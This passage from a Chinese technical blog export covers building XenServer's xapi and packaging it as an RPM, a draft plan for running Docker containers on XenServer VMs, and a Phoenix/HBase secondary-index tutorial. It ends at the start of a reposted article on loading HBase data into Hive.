<h1 id="创建编译容器"><a href="#创建编译容器" class="headerlink" title="创建编译容器"></a>创建编译容器</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> git://github.com/xenserver/xenserver-build-env</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> xenserver-build-env</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./build.sh</span></span><br></pre></td></tr></table></figure>

<h1 id="编译xapi-1"><a href="#编译xapi-1" class="headerlink" title="编译xapi"></a>编译<code>xapi</code></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./run.py -p xapi --<span class="built_in">rm</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- you are now inside the docker container ---</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> git://github.com/xapi-project/xen-api</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> xen-api</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure>

<h1 id="制作RPM-Package"><a href="#制作RPM-Package" class="headerlink" title="制作RPM Package"></a>制作RPM Package</h1><p>在Centos系统中制作RPM包，需要用到rpmbuild，所以你要用yum安装好。当然上面的编译容器已经将rpmbuild安装好了。那么的接下来的重点在于SPEC文件编写，SPEC用来告诉rpmbuild，制作的每一个过程需要做哪些动作。</p>
<p>SPEC文件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name:   xen-api     </span><br><span class="line">Version:    1.60.2</span><br><span class="line">Release:    1%&#123;?dist&#125;</span><br><span class="line">Summary:    rpm xen-api modify</span><br><span class="line"></span><br><span class="line">Group:      Application/test</span><br><span class="line">License:    Share   </span><br><span class="line">Source:     $RPM_SOURCE_DIR/xen-api-1.60.2_m.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%description</span><br><span class="line">print xen-api</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%prep</span><br><span class="line">rm -rf $RPM_BUILD_DIR/xen-api-1.60.2</span><br><span class="line">zcat $RPM_SOURCE_DIR/xen-api-1.60.2_m.tar.gz | tar xvf -</span><br><span class="line"></span><br><span class="line">%build</span><br><span class="line">cd $RPM_BUILD_DIR/xen-api-1.60.2</span><br><span class="line">./configure</span><br><span class="line">make %&#123;?_smp_mflags&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%install</span><br><span class="line">cd $RPM_BUILD_DIR/xen-api-1.60.2</span><br><span class="line">make install DESTDIR=%&#123;buildroot&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%files</span><br><span class="line">/etc</span><br><span class="line">/var</span><br><span class="line">/usr</span><br><span class="line">/opt</span><br><span class="line">%doc</span><br></pre></td></tr></table></figure>

<p>创建目录<code>SOURCE</code>，<code>SPECS</code>，<code>BUILD</code>，<code>RPMS</code>，<code>SRPMS</code>，将SPEC文件放入到<code>SPECS</code>文件件中，然后将源代码做成<code>xen-api-1.60.2_m.tar.gz</code>拷贝到<code>SOURCE</code>目录。最后执行<code>rpmbuild -ba &#123;SPEC文件&#125;</code>。执行完毕后，在<code>RPM</code>目录中生成我们需要的RPM包</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://xen-orchestra.com/forum/topic/562/xenserver-7-3-and-now-what-s-next">XenServer 7.3: and now, what’s next?</a></li>
</ul>
]]></content>
      <categories>
        <category>works</category>
      </categories>
      <tags>
        <tag>xenserver</tag>
      </tags>
  </entry>
  <entry>
    <title>XenServer中Docker容器实施方案（Preview）</title>
    <url>/2017/05/11/works/docker-over-xenserver-plans/</url>
    <content><![CDATA[<h1 id="概"><a href="#概" class="headerlink" title="概"></a>概</h1><p>依托现有虚拟化资源引入docker容器机制</p>
<p><img src="/images/work/xen_container_plan.png" alt="xen_container_plan.png"></p>
<ul>
<li>scheduler<br>  根据VM宿主机的负载或其他情况，决定容器运行在哪个VM上。</li>
<li>monitor<br>  监控VM宿主机和容器健康情况，当有容器或宿主机宕掉时，报告想过情况，其他模块根据monitor的报告做出相应的响应。</li>
<li>controller<br>  控制容器的启动停止、迁移、扩展等操作</li>
<li>docker engine<br>  ……</li>
<li>pipework<br>  管理容器网络，目前pipework支持手动配置容器ip，网关及路由；对DHCP支持存在问题；（考虑将pipework以plugin方式加入docker engine）</li>
<li>xe-daemon<br>  采集容器监控数据，并通过xenbus将数据发给xenserver</li>
</ul>
<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p><img src="/images/work/xen_container_network_plan.png" alt="xen_container_network_plan.png"></p>
<ul>
<li>宿主机有两个网络，一个管理网，一个数据网，宿主机内的所有容器使用数据网络</li>
<li>利用linux自带的bridge将宿主机的数据网与容器的veth pair相连，由此二层网络联通</li>
<li>宿主机开通ip_forward，实现三层转发</li>
<li>容器通过<code>pipework</code>脚本完成ip地址、路由、网关的配置</li>
</ul>
<h3 id="网络操作流程"><a href="#网络操作流程" class="headerlink" title="网络操作流程"></a>网络操作流程</h3><ol>
<li>根据网段创建bridge<br> 使用<code>docker network create --gateway &#123;宿主机IP&#125; --subnet &#123;宿主机子网&#125; -d bridge -o com.docker.network.bridge.name=&quot;&#123;网桥设备名称&#125;&quot; &#123;DockerNetwork名称&#125;</code>创建bridge。<br> eg： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker network create --gateway 10.37.129.4 --subnet 10.37.129.0/24 -d bridge -o com.docker.network.bridge.name=<span class="string">&quot;xennet0&quot;</span> xennet</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brctl show</span></span><br><span class="line">bridge name bridge id       STP enabled interfaces</span><br><span class="line">docker0     8000.0242df249633   no</span><br><span class="line">xennet0     8000.0242688f16c2   no </span><br></pre></td></tr></table></figure></li>
<li>桥接出口网卡<br> 使用<code>brctl addif &#123;bridge名称&#125; &#123;网卡名称&#125;</code>将出口网卡添加到指定网桥中，此处应根据xscontainer使用用户的权限决定是否需要增加<code>sudo</code>操作<br> eg: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addif xennet0 enp0s6</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brctl show</span></span><br><span class="line">bridge name bridge id       STP enabled interfaces</span><br><span class="line">docker0     8000.0242df249633   no</span><br><span class="line">xennet0     8000.0242688f16c2   no      enp0s6</span><br></pre></td></tr></table></figure></li>
<li>创建固定IP容器<br> 创建容器需要分配固定IP，该IP需要业务层分配，并与bridge同网段。<br> eg: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -d --name c1 --network xennet --ip 10.37.129.100 centos:7.3.1611 /usr/sbin/init</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -d --name c2 --network xennet --ip 10.37.129.200 centos:7.3.1611 /usr/sbin/init</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brctl show</span></span><br><span class="line">bridge name bridge id       STP enabled interfaces</span><br><span class="line">docker0     8000.0242df249633   no</span><br><span class="line">xennet0     8000.0242688f16c2   no      enp0s6</span><br><span class="line">                                        veth990ee82</span><br><span class="line">                                        vethf1f6fcb</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="宿主机重启流程"><a href="#宿主机重启流程" class="headerlink" title="宿主机重启流程"></a>宿主机重启流程</h3><p>*** 由于宿主机重启会导致bridge中记录的桥接出口网卡信息丢失，所以在宿主机重启后需要重新桥接出口网卡 ***</p>
<ol>
<li>桥接出口网卡<br> 同上</li>
<li>恢复原有容器<br> 使用<code>docker run</code> or <code>docker start</code>恢复容器</li>
</ol>
<h2 id="共享存储"><a href="#共享存储" class="headerlink" title="共享存储"></a>共享存储</h2><h2 id="通过虚拟机挂载共享存储"><a href="#通过虚拟机挂载共享存储" class="headerlink" title="通过虚拟机挂载共享存储"></a>通过虚拟机挂载共享存储</h2><ul>
<li>需要记录虚机挂载共享存储与容器的对应关系</li>
<li>在创建、迁移、删除容器时，需要对相关存储资源进行分配或回收</li>
</ul>
<h2 id="容器直接挂载共享存储"><a href="#容器直接挂载共享存储" class="headerlink" title="容器直接挂载共享存储"></a>容器直接挂载共享存储</h2><ul>
<li>一般容器<br>  使用RBD／NBD-RBD块设备存储，或NFS存储。对于RBD／NBD-RBD方式需要添加驱动；对于NFS方式docker原生支持。</li>
<li>Registry容<br>  使用RGW对象存储（S3&#x2F;Swift），测试中。。。</li>
</ul>
<h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><p>XenContainer</p>
<h2 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h2><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="流"><a href="#流" class="headerlink" title="流"></a>流</h1><p>服务发现（DNS）、负载均衡、容器镜像库均已容器形式提供服务。</p>
<p><img src="/images/work/xen_container_flow.png" alt="xen_container_flow.png"></p>
<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><ul>
<li>scheduler、monitor、controller 从头写吧</li>
<li>docker engine 需要修改一些api接口</li>
<li>pipework 需要从shell改成golang，以plugin方式加入docker engine</li>
<li>xe-daemon 需要增加ip地址采集</li>
<li>DNS Container 从头写吧</li>
</ul>
<p>*** 技术相关调研，请见下节“参” ***</p>
<h1 id="参"><a href="#参" class="headerlink" title="参"></a>参</h1><ul>
<li><a href="https://zhoubofsy.github.io/2017/05/08/container/docker/docker-network-pipework/">Docker网络管理——PIPEWORK</a></li>
<li><a href="https://zhoubofsy.github.io/2017/04/27/container/k8s/k8s-analyze-service-discovery/">K8s服务发现分析</a></li>
<li><a href="https://zhoubofsy.github.io/2017/03/29/container/k8s/k8s-service-expose/">k8s service expose</a></li>
<li><a href="https://zhoubofsy.github.io/2017/03/03/container/docker/docker-network/">Docker网络技术(Bridge)</a></li>
<li><a href="https://zhoubofsy.github.io/2017/03/01/container/rancher/rancher-dns-and-metadata/">Rancher服务发现分析</a></li>
</ul>
]]></content>
      <categories>
        <category>works</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>plan</tag>
        <tag>xenserver</tag>
      </tags>
  </entry>
  <entry>
    <title>Phoenix 二级索引</title>
    <url>/2017/10/19/bigdata/hadoop/Phoenix-index/</url>
    <content><![CDATA[<p>在Hbase中，只有一个单一的按照字典序排序的rowKey索引，当使用rowKey来进行数据查询的时候速度较快，但是如果不使用rowKey来查询的话就会使用filter来对全表进行扫描，很大程度上降低了检索性能。而Phoenix提供了二级索引技术来应对这种使用rowKey之外的条件进行检索的场景。</p>
<h1 id="Global-Index"><a href="#Global-Index" class="headerlink" title="Global Index"></a>Global Index</h1><p>Global indexing适用于多读少写的业务场景。使用Global indexing的话在写数据的时候会消耗大量开销，因为所有对数据表的更新操作（DELETE, UPSERT VALUES and UPSERT SELECT）,会引起索引表的更新，而索引表是分布在不同的数据节点上的，跨节点的数据传输带来了较大的性能消耗。在读数据的时候Phoenix会选择索引表来降低查询消耗的时间。*** 在默认情况下如果想查询的字段不是索引字段的话索引表不会被使用，也就是说不会带来查询速度的提升。 ***</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>HBase集群的每个regionserver节点的hbase-site.xml中加入配置，并重启HBase集群</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.regionserver.wal.codec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hbase.regionserver.wal.IndexedWALEditCodec<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注: phoenix有两种链接方式JDBC和phoenix-client，phoenix-client可以正常创建索引；zeppelin使用jdbc连接不能正常创建索引，提示如下错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java.sql.SQLException: ERROR 1029 (42Y88): Mutable secondary indexes must have the hbase.regionserver.wal.codec property set to org.apache.hadoop.hbase.regionserver.wal.IndexedWALEditCodec in the hbase-sites.xml of every region server. tableName=CMP_IDX</span><br><span class="line">    at org.apache.phoenix.exception.SQLExceptionCode$Factory$1.newException(SQLExceptionCode.java:464)</span><br><span class="line">    at org.apache.phoenix.exception.SQLExceptionInfo.buildException(SQLExceptionInfo.java:150)</span><br><span class="line">    at org.apache.phoenix.schema.MetaDataClient.createIndex(MetaDataClient.java:1293)</span><br><span class="line">    at org.apache.phoenix.compile.CreateIndexCompiler$1.execute(CreateIndexCompiler.java:85)</span><br><span class="line">    at org.apache.phoenix.jdbc.PhoenixStatement$2.call(PhoenixStatement.java:358)</span><br><span class="line">    at org.apache.phoenix.jdbc.PhoenixStatement$2.call(PhoenixStatement.java:341)</span><br><span class="line">    at org.apache.phoenix.call.CallRunner.run(CallRunner.java:53)</span><br><span class="line">    at org.apache.phoenix.jdbc.PhoenixStatement.executeMutation(PhoenixStatement.java:340)</span><br><span class="line">    at org.apache.phoenix.jdbc.PhoenixStatement.execute(PhoenixStatement.java:1511)</span><br><span class="line">    at org.apache.commons.dbcp2.DelegatingStatement.execute(DelegatingStatement.java:291)</span><br><span class="line">    at org.apache.commons.dbcp2.DelegatingStatement.execute(DelegatingStatement.java:291)</span><br><span class="line">    at org.apache.zeppelin.jdbc.JDBCInterpreter.executeSql(JDBCInterpreter.java:581)</span><br><span class="line">    at org.apache.zeppelin.jdbc.JDBCInterpreter.interpret(JDBCInterpreter.java:692)</span><br><span class="line">    at org.apache.zeppelin.interpreter.LazyOpenInterpreter.interpret(LazyOpenInterpreter.java:97)</span><br><span class="line">    at org.apache.zeppelin.interpreter.remote.RemoteInterpreterServer$InterpretJob.jobRun(RemoteInterpreterServer.java:498)</span><br><span class="line">    at org.apache.zeppelin.scheduler.Job.run(Job.java:175)</span><br><span class="line">    at org.apache.zeppelin.scheduler.ParallelScheduler$JobRunner.run(ParallelScheduler.java:162)</span><br><span class="line">    at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source)</span><br><span class="line">    at java.util.concurrent.FutureTask.run(Unknown Source)</span><br><span class="line">    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(Unknown Source)</span><br><span class="line">    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(Unknown Source)</span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)</span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)</span><br><span class="line">    at java.lang.Thread.run(Unknown Source)</span><br></pre></td></tr></table></figure>

<h2 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a>索引操作</h2><p>在开始创建索引以前先创建一个表，并向其中填充测试数据（此处填充的数据仅用于功能测试）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> usertable (id <span class="type">varchar</span> <span class="keyword">primary</span> key,firstname <span class="type">varchar</span>, lastname <span class="type">varchar</span>);</span><br><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="operator">!</span>tables</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CAT  <span class="operator">|</span> TABLE_SCHEM  <span class="operator">|</span>       TABLE_NAME        <span class="operator">|</span>  TABLE_TYPE   <span class="operator">|</span> REMARKS  <span class="operator">|</span> TYPE_NAME  <span class="operator">|</span> SELF_REFERENCING_COL_NAME  <span class="operator">|</span> REF_GENERAT <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> CATALOG                 <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> <span class="keyword">FUNCTION</span>                <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> SEQUENCE                <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> STATS                   <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> USERTABLE               <span class="operator">|</span> <span class="keyword">TABLE</span>         <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> upsert <span class="keyword">into</span> usertable(id, firstname, lastname) <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> upsert <span class="keyword">into</span> usertable(id, firstname, lastname) <span class="keyword">values</span>(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;phoenix&#x27;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base(main):019:0&gt; scan &#x27;USERTABLE&#x27;</span><br><span class="line">ROW                                 COLUMN+CELL</span><br><span class="line"> 1                                  column=0:FIRSTNAME, timestamp=1508397473229, value=Hello</span><br><span class="line"> 1                                  column=0:LASTNAME, timestamp=1508397473229, value=world</span><br><span class="line"> 1                                  column=0:_0, timestamp=1508397473229, value=x</span><br><span class="line"> 2                                  column=0:FIRSTNAME, timestamp=1508397529852, value=Hello</span><br><span class="line"> 2                                  column=0:LASTNAME, timestamp=1508397529852, value=world</span><br><span class="line"> 2                                  column=0:_0, timestamp=1508397529852, value=x</span><br><span class="line"> 3                                  column=0:FIRSTNAME, timestamp=1508397535836, value=Hello</span><br><span class="line"> 3                                  column=0:LASTNAME, timestamp=1508397535836, value=world</span><br><span class="line"> 3                                  column=0:_0, timestamp=1508397535836, value=x</span><br><span class="line"> 4                                  column=0:FIRSTNAME, timestamp=1508397643594, value=Hello</span><br><span class="line"> 4                                  column=0:LASTNAME, timestamp=1508397643594, value=phoenix</span><br><span class="line"> 4                                  column=0:_0, timestamp=1508397643594, value=x</span><br><span class="line"> 5                                  column=0:FIRSTNAME, timestamp=1508397648938, value=Hello</span><br><span class="line"> 5                                  column=0:LASTNAME, timestamp=1508397648938, value=phoenix</span><br><span class="line"> 5                                  column=0:_0, timestamp=1508397648938, value=x</span><br><span class="line">5 row(s) in 0.3220 seconds</span><br></pre></td></tr></table></figure>

<h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="keyword">create</span> index idx_name <span class="keyword">on</span> usertable (lastname) include(firstname);</span><br><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="operator">!</span>tables</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CAT  <span class="operator">|</span> TABLE_SCHEM  <span class="operator">|</span>       TABLE_NAME        <span class="operator">|</span>  TABLE_TYPE   <span class="operator">|</span> REMARKS  <span class="operator">|</span> TYPE_NAME  <span class="operator">|</span> SELF_REFERENCING_COL_NAME  <span class="operator">|</span> REF_GENERAT <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> IDX_NAME                <span class="operator">|</span> INDEX         <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> CATALOG                 <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> <span class="keyword">FUNCTION</span>                <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> SEQUENCE                <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span> <span class="keyword">SYSTEM</span>       <span class="operator">|</span> STATS                   <span class="operator">|</span> <span class="keyword">SYSTEM</span> <span class="keyword">TABLE</span>  <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> USERTABLE               <span class="operator">|</span> <span class="keyword">TABLE</span>         <span class="operator">|</span>          <span class="operator">|</span>            <span class="operator">|</span>                            <span class="operator">|</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------------------+---------------+----------+------------+----------------------------+-------------+</span></span><br><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="operator">!</span>index usertable</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------+-------------+------------------+-------------+-------+-------------------+--------------+----+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CAT  <span class="operator">|</span> TABLE_SCHEM  <span class="operator">|</span> TABLE_NAME  <span class="operator">|</span> NON_UNIQUE  <span class="operator">|</span> INDEX_QUALIFIER  <span class="operator">|</span> INDEX_NAME  <span class="operator">|</span> TYPE  <span class="operator">|</span> ORDINAL_POSITION  <span class="operator">|</span> COLUMN_NAME  <span class="operator">|</span> <span class="keyword">AS</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------+-------------+------------------+-------------+-------+-------------------+--------------+----+</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> USERTABLE   <span class="operator">|</span> <span class="literal">true</span>        <span class="operator">|</span>                  <span class="operator">|</span> IDX_NAME    <span class="operator">|</span> <span class="number">3</span>     <span class="operator">|</span> <span class="number">1</span>                 <span class="operator">|</span> <span class="number">0</span>:LASTNAME   <span class="operator">|</span> A  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> USERTABLE   <span class="operator">|</span> <span class="literal">true</span>        <span class="operator">|</span>                  <span class="operator">|</span> IDX_NAME    <span class="operator">|</span> <span class="number">3</span>     <span class="operator">|</span> <span class="number">2</span>                 <span class="operator">|</span> :ID          <span class="operator">|</span> A  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>            <span class="operator">|</span>              <span class="operator">|</span> USERTABLE   <span class="operator">|</span> <span class="literal">true</span>        <span class="operator">|</span>                  <span class="operator">|</span> IDX_NAME    <span class="operator">|</span> <span class="number">3</span>     <span class="operator">|</span> <span class="number">3</span>                 <span class="operator">|</span> <span class="number">0</span>:FIRSTNAME  <span class="operator">|</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------------+-------------+-------------+------------------+-------------+-------+-------------------+--------------+----+</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hbase(main):020:0&gt; scan &#x27;IDX_NAME&#x27;</span><br><span class="line">ROW                                 COLUMN+CELL</span><br><span class="line"> phoenix\x004                       column=0:0:FIRSTNAME, timestamp=1508397686228, value=Hello</span><br><span class="line"> phoenix\x004                       column=0:_0, timestamp=1508397686228, value=x</span><br><span class="line"> phoenix\x005                       column=0:0:FIRSTNAME, timestamp=1508397686228, value=Hello</span><br><span class="line"> phoenix\x005                       column=0:_0, timestamp=1508397686228, value=x</span><br><span class="line"> world\x001                         column=0:0:FIRSTNAME, timestamp=1508397686228, value=Hello</span><br><span class="line"> world\x001                         column=0:_0, timestamp=1508397686228, value=x</span><br><span class="line"> world\x002                         column=0:0:FIRSTNAME, timestamp=1508397686228, value=Hello</span><br><span class="line"> world\x002                         column=0:_0, timestamp=1508397686228, value=x</span><br><span class="line"> world\x003                         column=0:0:FIRSTNAME, timestamp=1508397686228, value=Hello</span><br><span class="line"> world\x003                         column=0:_0, timestamp=1508397686228, value=x</span><br><span class="line">5 row(s) in 0.3180 seconds</span><br></pre></td></tr></table></figure>

<h3 id="使用索引"><a href="#使用索引" class="headerlink" title="使用索引"></a>使用索引</h3><p>正常的select … where … 是不会用到索引表的，要想用到索引表，必须查询出的字段也是索引字段。(此处的结论需要在后续的性能测试中进行验证)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: jdbc:phoenix:<span class="operator">&gt;</span> <span class="keyword">select</span> firstname <span class="keyword">from</span> usertable <span class="keyword">where</span> lastname <span class="operator">=</span> <span class="string">&#x27;phoenix&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> FIRSTNAME  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> Hello      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Hello      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br></pre></td></tr></table></figure>

<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>Todo…</p>
<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>Todo…</p>
<h1 id="Local-Index"><a href="#Local-Index" class="headerlink" title="Local Index"></a>Local Index</h1><p>Todo…</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/mario-nb/p/6350266.html?utm_source=itdadao&utm_medium=referral">Phoenix的二级索引</a></li>
<li><a href="http://www.cnblogs.com/MOBIN/p/5467284.html">Phoenix二级索引(Secondary Indexing)的使用</a></li>
<li><a href="http://blog.csdn.net/lifuxiangcaohui/article/details/55518390">HBase phoenix二级索引</a></li>
</ul>
]]></content>
      <categories>
        <category>Big-Data</category>
      </categories>
      <tags>
        <tag>phoenix</tag>
        <tag>index</tag>
      </tags>
  </entry>
  <entry>
    <title>从hbase向hive导入数据</title>
    <url>/2017/09/04/bigdata/hadoop/hive-load-from-hbase/</url>
    <content><![CDATA[<p>** 纯转载 **</p>
<p>当我们用HBase 存储实时数据的时候， 如果要做一些数据分析方面的操作， 就比较困难了， 要写MapReduce Job。 Hive 主要是用来做数据分析的数据仓库，支持标准SQL 查询， 做数据分析很是方便，于是便很自然地想到用Hive来载入HBase的数据做分析， 但是很奇怪地是， 上网查了一下， 只看到以下两种情况：</p>
<ol>
<li>如何用Hive 往HBase里面插入大量的数据。</li>
